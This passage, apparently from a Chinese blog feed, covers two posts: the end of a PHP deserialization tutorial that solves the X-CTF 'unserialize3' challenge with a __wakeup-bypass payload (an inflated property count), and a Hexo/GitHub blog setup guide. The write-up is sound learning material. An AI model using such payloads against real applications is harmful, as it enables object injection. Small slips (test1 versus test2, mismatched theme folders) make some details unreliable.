class="hljs-variable">$test</span>);  <br></code></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123231004661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;test1&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>public序列化后的参数变成 <code>test1</code></p><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><blockquote><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$test1</span>=<span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);  <br></code></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123231030686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;\00test\00test2&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>private序列化后的参数被反序列化后变成 <code>\00test\00test2</code> </p><h3 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h3><blockquote><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$test3</span>=<span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);  <br></code></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123230813337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\00*\00test3&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>protected序列化后的参数变成 <code>\00*\00test3</code></p><h2 id="CTF中的反序列化"><a href="#CTF中的反序列化" class="headerlink" title="CTF中的反序列化"></a>CTF中的反序列化</h2><p> <em><strong>[X-CTF]unserialize3</strong></em><br>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>&#125;<br>?code=<br></code></pre></td></tr></table></figure><p>打开题目，进行代码审计，可以看到xctf类只拥有一个public的flag变量，值为111。对xctf类进行序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123; <br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable">$test</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">xctf</span>();<br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>序列化后的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>直接传参给code的结果<br><img src="https://img-blog.csdnimg.cn/20201014185510234.png#pic_center" alt="在这里插入图片描述"><br>我们要绕过<code>__wakeup</code>这个魔术函数，利用反序列化漏洞，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会绕过<code>__wakeup</code>的执行</p><p>将上面的序列化后字符串，对象属性个数由真实值1修改为2。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020101419075342.png#pic_center" alt="在这里插入图片描述"></p>]]></content>
    
    
    
    <tags>
      
      <tag>PHP反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人博客搭建历程</title>
    <link href="/posts/3212727670/"/>
    <url>/posts/3212727670/</url>
    
    <content type="html"><![CDATA[<p>@<a href="">TOC</a></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、hexo：提供博客框架，高效。<br>2、Node.js: 环境所需；Chrome上的JavaScript运行引擎，我们会用到 bode.js下的包管理器npm。<br>3、Git: 环境所需；免费、开源的分布式版本控制系统。<br>4、GitHub: 提供免费服务器，还有代码托管等功能。<br></code></pre></td></tr></table></figure><h2 id="Github的创建和配置"><a href="#Github的创建和配置" class="headerlink" title="Github的创建和配置"></a>Github的创建和配置</h2><p>官网：<a href="https://github.com/">https://github.com/</a></p><p><strong>1.注册账号</strong><br><img src="https://img-blog.csdnimg.cn/20210131213504600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2.新建仓库</strong><br>新建一个储存仓库，username为github用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username.github.io<br></code></pre></td></tr></table></figure><p>在主页右上角，点击加号，找到<code>New repository</code>，点进去会显示如下界面，输入仓库名，点击创建</p><p>Repository name格式推荐写成<code>username.github.io</code>,点击Create repository<br><img src="https://img-blog.csdnimg.cn/20210131214016120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>下载地址：<a href="https://git-scm.com/">https://git-scm.com/</a></p><p>一路next，打开cmd命令行，成功页面如下<br><img src="https://img-blog.csdnimg.cn/20210131140623911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>打开Git-Bash工具 ，初始化Git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.配置用户名<br>git config --global user.name <span class="hljs-string">&quot;用户名&quot;</span><br><span class="hljs-comment">#用户名可以不是Github用户名，为了方便，设置一致。</span><br>2.配置邮箱<br>git config --global user.email <span class="hljs-string">&quot;邮箱地址&quot;</span><br>3.查看已配置的用户信息<br>git config --global list<br></code></pre></td></tr></table></figure><h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>下载地址：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a><br><img src="https://img-blog.csdnimg.cn/20210131140950940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>打开cmd，进入文件目录，安装成功如下<br><img src="https://img-blog.csdnimg.cn/20210131141134259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为了加快速度，npm换源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Program Files\nodejs&gt;npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org<br><br>C:\Program Files\nodejs&gt;npm config get registry<br>https://registry.npm.taobao.org/<br></code></pre></td></tr></table></figure><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>本地安装hexo前，应该先创建一个新文件夹blog</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> f:/hexo<br><br>$ npm install hexo-cli -g<br><br>$ hexo init blog<br><br>$ <span class="hljs-built_in">cd</span> blog<br><br>$ npm install<br><br>$ hexo g <span class="hljs-comment"># 或者hexo generate</span><br><br>$ hexo s <span class="hljs-comment"># 或者hexo server，可以在http://localhost:4000/ 查看</span><br></code></pre></td></tr></table></figure><p>hexo命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo generate (hexo g) 生成静态文件，会在当前目录下生成一个新的叫做public的文件夹<br><br>hexo server (hexo s) 启动本地web服务，用于博客的预览<br><br>hexo deploy (hexo d) 部署播客到远端（比如github, heroku等平台）<br><br><span class="hljs-variable">$hexo</span> new <span class="hljs-string">&quot;postName&quot;</span> <span class="hljs-comment">#新建文章</span><br>$ hexo new page <span class="hljs-string">&quot;pageName&quot;</span> <span class="hljs-comment">#新建页面</span><br>$ hexo d -g <span class="hljs-comment">#生成部署</span><br>$ hexo s -g <span class="hljs-comment">#生成预览</span><br></code></pre></td></tr></table></figure><p>本地hexo配置情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\admin&gt;hexo -v<br>hexo-cli: 4.2.0<br>os: Windows_NT 10.0.19041 win32 x64<br>node: 14.15.4<br>v8: 8.4.371.19-node.17<br>uv: 1.40.0<br>zlib: 1.2.11<br>brotli: 1.0.9<br>ares: 1.16.1<br>modules: 83<br>nghttp2: 1.41.0<br>napi: 7<br>llhttp: 2.1.3<br>openssl: 1.1.1i<br>cldr: 37.0<br>icu: 67.1<br>tz: 2020a<br>unicode: 13.0<br></code></pre></td></tr></table></figure><h1 id="Hexo主题设置"><a href="#Hexo主题设置" class="headerlink" title="Hexo主题设置"></a>Hexo主题设置</h1><p>官方主题推荐：<a href="https://hexo.io/themes/">https://hexo.io/themes/</a></p><h2 id="主题1：stun"><a href="#主题1：stun" class="headerlink" title="主题1：stun"></a>主题1：stun</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><a href="https://theme-stun.github.io/docs/zh-CN/guide/quick-start.html#%E4%BD%BF%E7%94%A8">帮助文档</a><br>在Hexo 根目录下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean  <br><span class="hljs-comment">#该命令的作用是清除缓存，若不输入此命令，服务器有可能更新不了主题</span><br>$ git <span class="hljs-built_in">clone</span> https://github.com/liuyib/hexo-theme-stun.git themes/stun<br><br><span class="hljs-comment">#安装依赖hexo-renderer-pug</span><br>$ npm install --save hexo-renderer-pug<br></code></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>修改Hexo目录下的<code>_config.yml</code>配置文件中的theme属性，将默认的<code>landscape改</code>为为<code>black-blue</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">101| theme: stun<br></code></pre></td></tr></table></figure><p>然后，启动 Hexo 服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean <br>$ hexo s<br></code></pre></td></tr></table></figure><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> themes/stun<br>$ git pull<br></code></pre></td></tr></table></figure><h3 id="本地效果"><a href="#本地效果" class="headerlink" title="本地效果"></a>本地效果</h3><p>访问：<a href="http://localhost:4000/">http://localhost:4000/</a><br><img src="https://img-blog.csdnimg.cn/20210131211931994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="主题优化"><a href="#主题优化" class="headerlink" title="主题优化"></a>主题优化</h3><p>安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ npm install --save hexo-render-pug<br>$ npm install --save hexo-generator-search<br>$ npm install --save hexo-deployer-git  <br></code></pre></td></tr></table></figure><p>1.增加页面导航</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$ hexo <span class="hljs-keyword">new</span> page categories<br>$ hexo <span class="hljs-keyword">new</span> page tags<br></code></pre></td></tr></table></figure><p>在项目目录<code>/source/categories/index.md</code> 加上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span>: categories<br></code></pre></td></tr></table></figure><p>在项目目录<code>/source/tags/index.md</code> 加上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span>: tags<br></code></pre></td></tr></table></figure><p>修改配置文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#展示设置</span><br>title: &#123;$自定义文字&#125;<br>language: zh-CN <br>url: &#123;$博客地址&#125;<br><br><span class="hljs-comment">#主题</span><br>theme: stun<br><br><span class="hljs-comment">#git相关</span><br>deploy:<br>  type: git<br>  repo: <br>  github: &#123;$你的博客仓库&#125;<br>  gitee: &#123;$你的博客仓库&#125;<br>  branch: master<br><br><span class="hljs-comment">#搜索相关</span><br>search:<br>  path: search.json<br>  field: post<br>  content: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>2.修改部署文件夹下/themes/stun/_config.yml(挑选重要部分修改)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#取消导航栏注释（注意空格对齐）</span><br>menu:<br>  categories: /categories/ || fas fa-layer-group<br>  tags: /tags/ || fas fa-tags<br>  <br><span class="hljs-comment">#更改图标(最好使用链接地址，我这里使用的图床，图床使用见下一篇博客)</span><br>favicon:<br>  small: https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-16x16.png<br>  medium: https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-32x32.png<br><br><span class="hljs-comment">#更改背景大图</span><br>header:<br>  bg_image:<br>    <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>    url: https://gitee.com/BothSavage/PicGo/raw/master/image/背景.png<br><br><span class="hljs-comment">#更改头像大图，并设为圆形</span><br>author:<br>  avatar:<br>    url: https://gitee.com/BothSavage/PicGo/raw/master/image/头像.png<br>    rounded: <span class="hljs-literal">true</span><br>    <br><span class="hljs-comment">#打开访问统计</span><br>busuanzi:<br>  <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>  <br><span class="hljs-comment">#打开搜索功能</span><br>local_search:<br>  <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="主题2：black-blue"><a href="#主题2：black-blue" class="headerlink" title="主题2：black-blue"></a>主题2：black-blue</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br>$ git <span class="hljs-built_in">clone</span> https://github.com/maochunguang/black-blue.git themes/stun<br><br><span class="hljs-comment">#安装依赖</span><br>npm install --save hexo-renderer-jade hexo-renderer-stylus<br>npm install --save hexo-generator-feed hexo-generator-sitemap hexo-generator-archive hexo-browsersync<br></code></pre></td></tr></table></figure><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">101| theme: black-blue<br></code></pre></td></tr></table></figure><p>保存然后执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean <br>$ hexo g <span class="hljs-comment"># 生成</span><br>$ hexo s <span class="hljs-comment"># 启动本地web服务器</span><br></code></pre></td></tr></table></figure><h3 id="更新主题"><a href="#更新主题" class="headerlink" title="更新主题"></a>更新主题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> themes/black-blue<br>$ git pull<br></code></pre></td></tr></table></figure><h2 id="主题3：spfk"><a href="#主题3：spfk" class="headerlink" title="主题3：spfk"></a>主题3：spfk</h2><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br>$ git <span class="hljs-built_in">clone</span> https://github.com/luuman/hexo-theme-spfk.git themes/stun<br></code></pre></td></tr></table></figure><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">101| theme: black-blue<br></code></pre></td></tr></table></figure><p>保存然后执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean <br>$ hexo g <span class="hljs-comment"># 生成</span><br>$ hexo s <span class="hljs-comment"># 启动本地web服务器</span><br></code></pre></td></tr></table></figure><h3 id="主题优化-1"><a href="#主题优化-1" class="headerlink" title="主题优化"></a>主题优化</h3><p><strong>1.博客个人信息</strong><br>修改Hexo文件夹根目录下的 <code>_config.yml</code> 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#站点标题</span><br><span class="hljs-number">6</span>| title: Atkx<span class="hljs-string">&#x27; blog</span><br><span class="hljs-string">#作者</span><br><span class="hljs-string">10| author: Atkx</span><br></code></pre></td></tr></table></figure><p><strong>2.头像设置</strong><br>这里修改主题文件夹下的<code>_config.yml</code> 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># Link to your avatar |填写头像地址</span><br><span class="hljs-number">16</span>| avatar: img/atkx_32x32.png<br><span class="hljs-comment"># Small icon of Your site | 站点小图标地址</span><br><span class="hljs-number">19</span>| favicon: img/atkx_16x16.png<br></code></pre></td></tr></table></figure><h1 id="Hexo部署到github"><a href="#Hexo部署到github" class="headerlink" title="Hexo部署到github"></a>Hexo部署到github</h1><h2 id="配置github-ssh"><a href="#配置github-ssh" class="headerlink" title="配置github ssh"></a>配置github ssh</h2><blockquote><p>只有配置好 SSH 密钥后，我们才可以通过 git 操作实现本地代码库与 Github 代码库同步。</p></blockquote><p>在你第一次新建的文件夹里面，点击 Git Bash Here 输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh-keygen -t rsa -C <span class="hljs-string">&quot;你的邮箱&quot;</span><br></code></pre></td></tr></table></figure><p>生成一对密钥 SSH key，持续enter。</p><p>在路径<code>C:\Users\admin\.ssh</code>下找到<code>id_rsa.pub</code>，用记事本打开，复制里面的内容。</p><p>配置路径：github 网站–&gt;Settings–&gt;SSH and GPG keys–&gt;NEW SSH KEY ,title随便填写，把上面复制的内容粘贴进Key里面，点击Add SSH key。</p><p><img src="https://img-blog.csdnimg.cn/20210131144015618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入命令检验是否成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh -T git@github.com<br>Hi swhat! You<span class="hljs-string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span><br></code></pre></td></tr></table></figure><h2 id="部署文件"><a href="#部署文件" class="headerlink" title="部署文件"></a>部署文件</h2><p>用sublime打开blog下创建的用户名文件进行部署（将文件直接拖进去就可以了）打开仓库<code>_config.yml</code> 配置文件，</p><p>第16行,更改url</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://swhat.github.io<br></code></pre></td></tr></table></figure><p>拉到文件末尾，填上如下配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/one-command-deployment</span><br>deploy:<br>  <span class="hljs-built_in">type</span>: git<br>  repo: https://github.com/swhat/swhat.github.io.git <br>  <span class="hljs-comment">#仓库名字改成自己的</span><br>  branch: master<br></code></pre></td></tr></table></figure><p><em>若端口冲突，也可以在<code>_config.yml</code>中添加</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 